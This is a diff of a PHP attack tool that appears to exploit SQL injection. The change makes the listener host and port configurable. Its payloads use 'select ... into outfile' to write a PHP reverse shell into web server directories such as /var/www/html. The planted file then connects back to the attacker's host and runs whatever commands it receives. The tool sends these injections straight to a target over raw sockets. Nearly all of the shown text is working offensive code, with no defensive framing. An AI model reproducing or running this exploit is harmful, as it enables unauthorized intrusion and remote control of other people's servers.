@@ -13,9 +13,10 @@ echo"          \ V / ___ \| |___ | || |_| / ___ \| || |_| |  _ </_  _\    \n";
 echo"           \_/_/   \_\_____|___|____/_/   \_\_| \___/|_| \_\ \/      \n";
 echo"                                                                     \n";
 echo"                                                                     \n";
-echo"                                                By: UnknownAD -_- \n";
+echo"                                                By: Unnknown AD -_-  \n";
 
-
+$lhost=readline("Shell Validator > lhost :");
+$lport=readline("Shell Validator > lport :");
 $wordlist=array("/var/www/html/shell_magnify.php","c:/wamp/www/shell_magnify.php");
 $http_file_interaction=0;
 if(strpos(implode(" ",$argv),"--headers-file")){
@@ -111,7 +112,7 @@ return array(explode("=",$cookies)[0]);
   }
 }
 function http_attack($host,$index="/",$method,$cookies="",$addition=array()){
-      global $wordlist;
+      global $wordlist,$lhost,$lport;
       unset($addition["User-Agent"]);
       unset($addition["Host"]);
       unset($addition["Connection"]);
@@ -122,10 +123,7 @@ function http_attack($host,$index="/",$method,$cookies="",$addition=array()){
       foreach($wordlist as $p){
         $p=str_replace("\n","",$p);
         $p="\"$p\"";
-        
-        //                                 CHECK THE README FILE !!
-        
-      $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell"./*host*/",'127.0.0.1',"/*port*/"9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; \"","b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,"/*host*/."'127.0.0.1',"/*port*/."9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile $p#");
+      $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; \"","b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost'".",$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile $p#");
 
       foreach($cmd as $command){
       $blank_="";
@@ -164,12 +162,12 @@ function http_attack($host,$index="/",$method,$cookies="",$addition=array()){
 function get($param,$w){
     global $index;
     global $cmd;
-    global $hostname,$method;
+    global $hostname,$method,$lhost,$lport;
      // the buffer size is depending on the file size (20258)
     foreach($w as $p){
 
-    $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; #"
-  ,"b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'127.0.0.1',9999);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile " ."\"$p\" #");
+    $cmd=array("a"=>"1';select \" <?php $"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\" into outfile '$p'; #"
+  ,"b"=>"1\";select \"<?php "."$"."shell=socket_create(AF_INET,SOCK_STREAM,0);socket_connect($"."shell,'$lhost',$lport);while(1){socket_write($"."shell,shell_exec(socket_read($"."shell,1024)));}?>\""." into outfile " ."\"$p\" #");
         foreach($cmd as $command){
             $api=socket_create(AF_INET,SOCK_STREAM,0);
             socket_connect($api,$hostname,80) or die('unable to reach the target host');
